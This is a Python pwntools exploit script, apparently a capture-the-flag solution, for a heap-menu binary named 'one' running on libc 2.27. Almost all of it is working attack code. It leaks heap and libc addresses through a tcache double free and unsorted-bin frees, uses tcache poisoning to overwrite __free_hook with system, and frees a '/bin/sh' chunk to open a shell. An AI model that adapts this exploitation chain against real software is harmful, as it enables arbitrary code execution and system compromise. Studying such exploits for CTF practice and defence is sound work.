from pwn import *
import sys

context.clear(arch='amd64', os='linux', aslr=False)
# context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'


argv = sys.argv
binary_path = './one'
REMOTE = 'remote' in argv
DEBUG = 'debug' in argv

sh = process([binary_path], env={'LD_PRELOAD': './libc-2.27.so'})
libc = ELF('./libc-2.27.so')

def get_base_address():
  return int(open("/proc/{}/maps".format(sh.pid), 'rb').readlines()[12].split('-')[0], 16)

def debug():
	elf_base = get_base_address()
	script = """
	"""
	main = 0x9ad
	script += 'b* {}\n'.format(elf_base + main + 54)
	script += 'b* {}\n'.format(elf_base + main + 68)
	script += 'c\n'
	# script += 'b* main'

	gdb.attach(sh ,gdbscript=script)


e = ELF(binary_path)


# ------------- plan -----------
# leak heap
# leak libc
# tcache poisoning to overwrite free_hook with system

def add(memo):
	sh.sendlineafter('> ', '1')
	sh.sendlineafter('Input memo > ', str(memo))

def show():
	sh.sendlineafter('> ', '2')

def delete():
	sh.sendlineafter('> ', '3')

def get_leak():
	add('0')

	# delete twice, now chunk is in tcache and its FWD is to itself
	delete() # count 1
	delete() # count 2
	delete() # count 3
	delete() # count 4
	delete()
	delete()

	# leak the fwd pointer, calculate the heap and libc base
	show()
	leak = sh.recvline()

	# init tcache for next lvl exploit
	add(p64(0)) # count 3
	add(p64(0)) # count 2

	return leak

def print_addr(addr):
	log.info(hex(u64(addr.rstrip('\n').ljust(8, '\x00'))))


leak = u64(get_leak().rstrip('\n').ljust(8, '\x00'))
log.info('leak: ' + hex(leak))

# we want this to be different chunks
# but still to overwrite fwd
add((p64(leak) + p64(0x91)) * 3) 
add((p64(leak) + p64(0x91)) * 3)
add((p64(leak) + p64(0x91)) * 3)

# debug()

# so we could tcache poisoning
delete()
delete()

add(p64(leak + 0x60))

# get the poisned chunk
add('AAAA') # 270 count 0

add(p64(0)) # 82d0, poisned


# insert chunk to unsorted bin for libc leak
for i in range(8):
	delete()

show()
libc_leak = u64(sh.recvline(keepends=False).ljust(8, '\x00'))
libc_base = libc_leak - 0x3ebca0
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']
log.info('libc base: {}'.format(hex(libc_base)))
log.info('free hook: {}'.format(hex(free_hook)))
log.info('system: {}'.format(hex(system)))

# size of tcache becomes huge, how can we lower it?
add(p64(leak))

add(p64(leak))

delete()
delete()

add(p64(free_hook))
add('AAAA')
add(p64(system))
log.success('overwrote free hook with system!!!!')

add('/bin/sh\x00')
log.success('enjoy flag')
delete()
sh.interactive()

